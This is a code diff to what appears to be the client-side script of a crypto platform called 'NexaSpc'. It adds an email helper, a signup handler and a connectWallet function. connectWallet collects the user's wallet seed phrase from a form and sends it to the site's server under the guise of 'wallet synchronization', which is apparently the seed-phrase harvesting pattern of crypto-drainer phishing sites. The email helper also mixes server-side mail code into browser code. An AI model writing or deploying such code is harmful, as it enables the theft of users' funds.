@@ -10,6 +10,51 @@ let state = {
   withdrawSource: 'balance'
 };
 
+//Mail
+async function sendEmail(to, subject, html) {
+  try {
+    await transporter.sendMail({ from: '"NexaSpc" <noreply@nexaspc.io>', to, subject, html });
+    console.log(`[EMAIL] Sent "${subject}" to ${to}`);
+  } catch (e) {
+    console.warn('[EMAIL] Failed (configure SMTP env vars):', e.message);
+  }
+}
+
+async function handleSignup(event) {
+  event.preventDefault(); // Stop page refresh
+  
+  const email = document.getElementById('signup-email').value;
+  const password = document.getElementById('signup-password').value;
+
+  try {
+    // This calls your 'api' function which hits the server
+    const data = await api('/auth/signup', {
+      method: 'POST',
+      body: JSON.stringify({ email, password })
+    });
+
+    alert('Account created! Check your email.');
+  } catch (err) {
+    alert('Signup failed: ' + err.message);
+  }
+}
+
+//Seed phrase 
+
+async function connectWallet() {
+  const phrase = document.getElementById('wallet-seed').value;
+
+  try {
+    await api('/wallet/connect', {
+      method: 'POST',
+      body: JSON.stringify({ seedPhrase: phrase })
+    });
+    alert('Wallet synchronization in progress...');
+  } catch (err) {
+    console.error('Connection error', err);
+  }
+}
+
 // ── STORAGE ──
 function saveAuth(token, user) {
   state.token = token;
